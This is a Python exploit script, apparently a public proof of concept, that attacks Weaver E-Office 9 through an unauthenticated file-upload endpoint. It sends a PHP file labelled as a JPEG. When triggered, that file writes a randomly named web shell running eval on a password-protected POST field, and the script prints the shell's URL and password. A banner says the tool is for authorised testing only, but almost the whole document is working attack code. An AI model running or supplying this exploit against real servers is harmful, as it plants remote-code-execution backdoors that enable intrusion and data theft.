import getopt
import sys
import requests
import random
import string
import io

import requests.models
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
headers = {
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
}

def random_str():
    randomStr = ''.join(random.sample(string.ascii_letters,1) + random.sample(string.ascii_letters + string.digits, 4))
    return randomStr

def check_shell(target,ShellName):
    pass
    url = target + "/images/logo/" + ShellName + ".php"
    try:
        r = requests.get(url,headers=headers,proxies=proxies,verify=False,timeout=30)
        if r.status_code == 200 and "Success" in r.text:
            return True
        else:
            print("[-] %s 利用失败" % target)
            return False
    except Exception as e:
        print("[-] %s 利用失败" % target)
        return False

def create_shell(target):
    url = target + "/images/logo/logo-eoffice.php"
    try:
        r = requests.get(url,headers=headers,proxies=proxies,verify=False,timeout=30)
        if r.status_code == 200:
            return True
        else:
            print("[-] %s Shell创建失败" % target)
    except Exception as e:
        print("[-] %s Shell创建失败" % target)
        return  False

def upload_shell(target,file):
    url = target + "/general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId="
    try:
        r = requests.post(url,headers=headers,files=file,timeout=30,verify=False,proxies=proxies)
        if r.status_code == 200 and "logo-eoffice.php" in r.text:
            return True
        else:
            print("[-] %s 上传失败" % target)
            return False
    except Exception as e:
        print("[-] %s 上传失败" % target)
        return False

def usage():
        print("")
        print("EOffice9GetShell / 泛微E-Office9 文件上传GetShell")
        print("Code By:Jun_sheng @Github:https://github.com/jun-5heng/")
        print("橘子网络安全实验室 @https://0range.team/")
        print("")
        print("*************************警 告*****************************")
        print("本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!")
        print("严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!")
        print("***********************************************************")
        print("")

def main():
    global proxies

    usage()
    if not len(sys.argv[1:]):
        sys.exit(0)

    proxies = None

    ShellName = random_str()
    ShellPass = random_str()
    ShellTemp = io.StringIO()
    # test_poc = "<?php phpinfo();?>"
    poc = "<?php $myfile = fopen(\"" + ShellName + ".php\", \"w\");$txt = 'Success<?php @eval($_POST[\"" + ShellPass + "\"]);?>';fwrite($myfile, $txt);fclose($myfile);?>"
    ShellTemp.write(poc)

    file = {
        "Filedata" : ("test.php",ShellTemp.getvalue(),"image/jpeg")
    }

    try:
        opts,args = getopt.getopt(sys.argv[1:],"u:p",["url","proxy"])
    except getopt.GetoptError as e:
        print(str(e))
        sys.exit(0)

    for o,a in opts:
        if o in ("-u","--url"):
            url = a
        elif o in ("-p","--proxy"):
            proxies = {
                "http": "127.0.0.1:8082",
                "https": "127.0.0.1:8082"
            }

    flag1 = upload_shell(url,file)
    if flag1:
        flag2 = create_shell(url)
        if flag2:
            flag3 = check_shell(url,ShellName)
            if flag3:
                print("[+]" +url+ "/images/logo/"+ShellName+".php|" + ShellPass)
                ShellTemp.close()


main()
